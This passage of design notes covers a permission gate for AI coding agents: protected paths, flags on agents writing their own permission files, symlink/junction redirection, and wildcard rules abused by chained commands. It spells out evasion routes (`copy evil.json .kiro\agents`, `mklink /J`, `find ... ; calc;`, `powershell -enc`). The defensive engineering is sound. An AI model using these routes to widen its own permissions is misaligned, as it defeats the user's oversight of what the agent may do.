Set-Content config.json …` passes it — pinned as a theory row, so the doc and the matcher cannot drift — as do a copy into the folder, a script, and anything a command launches. Under Prompt and Allow-edits it is a red call-out on a banner the user already had; under Allow-all it is the only stop, and only for the literal spelling. **Both halves hold only for a command the backend ASKED about** — one it approves itself reaches no rule here (tier 3), so no doc may say "every command is put to you" without that qualifier. The check that sees the FILE rather than the request is the config.json integrity check above, and it is not built. **Precedence**: ours ahead of the escalation files' where one line names both, as on the path route (`CautionMatch`, the handler's shared hit type, was `EscalationMatch`). A host on `ProtectedPaths.None` opts out of both routes. The sentences are `CommandBannerReason`/`CommandRowReason` ("Names Code Wicket's own settings file"), "names" for the escalation files' reason. Covered by `PolicyPermissionHandlerTests` (the command-route block: Allow-all prompts flagged on the spelling with the command sentences; the precedence; `None` opts out; the spellings, the documented limit included, as a theory); an injection removing the command-line match proven LOAD-BEARING (2 of 127: the Allow-all prompt and the precedence test).

**Escalation files — a write to a backend's own permission configuration (issue #269 follow-on; `Core.EscalationFiles`):** the third built-in occupant of the caution tier, and the protected-path rule one step earlier. The backend's gate runs BEFORE ours and its inputs are files: claude-agent-acp reads `permissions.defaultMode` and `permissions.allow` from `<cwd>/.claude/settings.json` and `.claude/settings.local.json` (the latter gitignored, so exempt from the SDK's own escalation filter — the table above); Kiro takes a workspace `.kiro/agents/<name>.json` over a built-in or configured agent of the same name, trust rules included, and v3 persists its always-rules in `permissions.yaml` under `~/.kiro/settings` and `~/.kiro/workspace-roots/<hash>`. Once an allow is in one of those the agent stops asking and this policy sees nothing (tier 3). **The write that puts it there is the one step that is visible**, on every backend that asks about writes at all — and under our Allow-edits it was OUR gate that let it through: Claude still asks (we pin its ask mode), the request reaches the mode ladder, and the Edit tier approved it with no banner. That is the protected-path shape one directory over, and it takes the same fix: a rule in code, with no representation an agent can edit, checked ahead of every allow rule, remembered glob and mode. **Two routes, two matchers.** A file-scoped request is matched at the END of its path (`MatchPath`: the names are the same under any root, so the user's `~/.claude/settings.json` counts as much as the workspace copy), reads exempt as for `ProtectedPaths`. A shell command is matched ANYWHERE in the text the caution list already scans (`MatchText`, case-insensitive, either separator, not glued to a preceding word so `x.claude/…` is not the folder), and the fragment returned is the exact spelling on screen, because that is what the banner highlights; on a command line a read cannot be told from a write (`cat` and `echo >` both name the file), so a command asks in both directions — a `cat .kiro/agents/x.json` under Allow-all gets the red banner, and that is the direction the caution tier is built to err in. **On the command route the bare `.kiro/agents` folder counts too** (measured in Visual Studio, 2026-09-12: `dir .kiro\agents` drew an ordinary banner under the file-only shape): a command can target the folder itself — `copy evil.json .kiro\agents` — and it holds nothing but agent definitions, whereas `.claude` holds commands and docs alike, so there the file names stay the rule. A file-scoped write always names a file, so the path route is unchanged. **And the command route is a spelling test and nothing more**: a line that writes the file without naming it (`copy settings.json .claude\`, `xcopy evil\.claude .claude /s`, `cd .claude && copy ..\x settings.json`, `git checkout evil -- .claude`, a `tar -xf`) passes it untouched, and matching the bare `.claude` folder would miss those anyway while red-flagging every `git add .claude` in this repository. Under Prompt and Allow-edits every command that REACHES us prompts regardless (one the backend does not ask about reaches no rule here), so the red is a highlight on a banner the user was reading anyway; under Allow-all commands run on the user's own choice and the tripwire catches the literal spelling, which is what a model writes when it wants that file (three spellings in three tools in that session). The spelling-independent form is to watch the EFFECT — a watcher on the escalation files while a session is live, raising a notice when one changes — which is noted on #283 and not built. **The sentences are the rule's own** — `WriteBannerReason`/`CommandBannerReason` on the banner ("Writes / Names a file that sets what the agent may do without asking"), `WriteRowReason`/`CommandRowReason` on the row — and "names" rather than "writes" on the command route because the line cannot be read that far. **What it is not**: a wall. It flags the escalation's first step while the backend still asks; the pin is what keeps Claude's mode ours, Kiro has no lever, a backend that never asks about writes walks past it, and a custom ACP agent's permission files are not on the list because we do not know them (the user docs say *asks*, never *prevents*). Whether Claude's `permissions.allow` in the same file walks past the pin is unmeasured (#286) — if it does, this rule is the only thing that sees the step. Covered by `PolicyPermissionHandlerTests` (the escalation-files block: Allow-edits prompts flagged on the path with the write sentences; a path allow-list and Allow-all do not lift it; a read is not flagged; a command line prompts flagged on the file's spelling with the command sentences; neighbouring `.claude/commands` and `.kiro/steering` writes are not flagged; the spellings on both routes as theories); an injection removing the escalation-file match proven LOAD-BEARING (the three prompt tests fail, 3 of 109).

**Linked writes — a path that reaches its file through a link below the root (`Core.LinkedWrite`):** the fourth built-in occupant of the caution tier, and the one that exists because the other three judge a **spelling**. `ProtectedPaths` asks whether a path lies under the host's own state roots and `EscalationFiles` whether it ends in one of the backends' permission files; both resolve the path with `Path.GetFullPath`, which never touches the filesystem. So a junction inside the working tree — `src\notes` → `%APPDATA%\code-wicket` — gives an agent a path that passes both tests and lands on the file the protected-path rule exists to protect, and the row, the banner and the log all describe the path as written. **Creating one costs nothing and asks nobody**: `mklink /J` needs no privilege (which is also why a cloned repository can carry one), and it is a *command*, so under Allow-all, or on a backend that approves its own commands, no rule of ours sees it happen. **The claim made is the one that can be kept.** Resolving the link to see whether it actually lands somewhere protected means following it, and following a link that names a UNC share is the NTLM handshake and SMB timeout that the inline-image containment was written to refuse — so the question asked is the one answerable without opening anything: does any component below the agent's root redirect (`ReparsePoints.AnyBelow`, reading each entry's reparse TAG)? Where it does, the path's spelling has no authority and the user decides. **Only BELOW the root** — a developer's `C:\src` junction onto another volume carries the whole tree and moves nothing out of reach, the same distinction the inline-image containment draws — **only where a root is known**, a null `AgentWorkspaceRoot` reading no disk at all, and **only a write**, reads being exempt for the reason they are exempt above. **The root is the AGENT's, not the solution's** (#54): the host sets `PolicyPermissionHandler.AgentWorkspaceRoot` where it sets the edit applier's root, on every session start, or a write would be judged for links below a tree the agent has left. **The cost is a prompt on a repository that genuinely contains links inside itself** (a pnpm `node_modules` is the realistic case), which is the direction the caution tier errs in everywhere else. **What it is not**: a wall, and not a guarantee about the bytes. It sees only the writes a backend ASKS about (tier 3), and it is a check at the moment of asking — a link created after the answer names a different file by the time the write lands, which nothing host-side can close while the backend owns the write. The sentences are the rule's own (`BannerReason`/`RowReason`), and the row's names the consequence rather than the mechanism, so a reader with an allow rule over the folder learns why it did not apply. Covered by `PolicyPermissionHandlerTests` (the link-guard block: Allow-edits prompts flagged on the path with these sentences; a path allow-list and Allow-all do not lift it; a plain path under the same root is not flagged; a read is not; no root reported asks nothing; the predicate's own answers) — the only tests here that touch the disk, a junction being a real filesystem object with no honest fake; injected by removing the link check.

**A wildcard in the agent's command is not a wildcard in the rule (pre-release security review, September 2026; `Core.PermissionGlob`):** the banner's "always" step seeded its editable pattern with `request.Command` verbatim, and `GlobToRegex` then compiled every `*` in it to `.*`. So the agent, which writes the command, wrote the rule's shape: approve `find . -name "*.cs"` with the default pattern and `find . -name "x"; calc; echo ".cs"` was rule-allowed for the rest of the session, or permanently with the persist box ticked, the row reading "allowed automatically by a rule". The glob language gained an escape — `[*]` and `[?]` are the literal characters, a bracket around anything else stays a bracket, not a character class — and the banner seeds `PermissionGlob.Escape(command)`, so accepting the default means exactly the command on screen and widening is the user's own edit. **A bracket pair and not a backslash**, because every rule here is a Windows command line or path and a backslash escape would change the meaning of every rule saved before it. **Existing saved rules keep their meaning**: a `*` already in config stays a wildcard, nobody being able to tell now whether it was meant literally. The grammar lives in Core because the banner (UI) writes it and the policy (Shell) reads it, and a rule has to survive its own round trip. Paths are seeded unescaped — Windows paths cannot carry a wildcard. Covered by `PermissionGlobTests` (escape, compile, brackets-are-literal, the banner seed); an injection seeding the command unescaped LOAD-BEARING. 

**A wildcard rule never covers a line with a shell operator in it (pre-release security review, September 2026; `Core.ShellOperators`):** a saved `git *` — the widening the banner suggests — matched `git status && powershell -enc …` whole, because `.*` covers an operator as happily as anything else, and the row read "allow-list". **A refusal, never a detector.** Splitting the line on operators cannot be done honestly: which shell runs it is the backend's choice (bash, PowerShell and cmd disagree about what an operator is), quoting decides whether one counts, and a parser wrong about any of that fails silently in the dangerous direction — and is still blind to arguments that execute with no operator (`git -c core.pager=calc`, `find -exec`, `bash -c`). The claim made is the one that can be kept: **a rule with a wildcard in it (`PermissionGlob.HasWildcard`, so an escaped `[*]` does not count) never auto-approves a line containing one of `& | ; > < (` `` ` `` or a line break, quoting ignored.** It errs only towards the banner. **The set is the UNION over the shells and it is code, not config**: the union is what makes a fixed list practical and stable, and the only safe edit is an addition, which the caution list already is; a floor config can lower is a floor an attacker can lower. **Chosen broad, because broader errs safe**: `(` closes PowerShell's argument subexpression and `>`/`<` close redirection — a file write by a rule that named a program, the settings file by another door — at the cost of a banner on `git commit -m "fix (typo)"` under `git *`. **Exact rules are exempt** (they already name the whole line the user approved), a withheld wildcard never shadows an exact rule behind it, and **it is NOT the caution tier**: the line falls through to the mode (AcceptAll still allows it) and then to the ORDINARY banner, carrying `PermissionRequest.RuleNote` — "Your rule “git *” was not applied because the command contains “&&”…" — in the subtle tone with "Allow always" still offered, because a red banner here would train the click-through red exists to prevent. A deny glob keeps matching whatever it matches. The always-step shows `ShellOperators.WideningHint` under a command glob, so the widening the banner suggests says what it grants and what it never does. `engine.log` writes `[permission] rule withheld: …` and `rule-withheld` on the prompt line. Covered by `ShellOperatorsTests` (the set, quoting ignored, the sentence, the banner note and hint) + `PolicyPermissionHandlerTests` (each operator, exact and escaped rules exempt, session rule, ordering, AcceptAll, deny) + a DTO round trip; an injection making the operator scan find nothing LOAD-BEARING.

**Duplicate allow-options (issue #43):** a backend can send two options of one kind — Kiro sends a second `allow_always`, "Allow all for this session" — which the by-kind label canonicalization would render as two identical "Allow always" buttons.

**`AcpMapper.ToPermissionRequest` de-duplicates options by kind** (keeps the first of each; empty-kind options never dedupe), so the banner gets one option per kind. We drop rather than differentiate because our **"Allow always" already spans that whole space**: its editable glob is the breadth axis (widen to `*` = all commands) and the "save permanently" checkbox the duration axis (session vs config `AllowedCommands`), so Kiro's session-wide preset is a strict subset — no capability lost. (A user-selectable "our model vs the agent's own" permission model is not built.) Covered by `AcpMapperPermissionTests`.
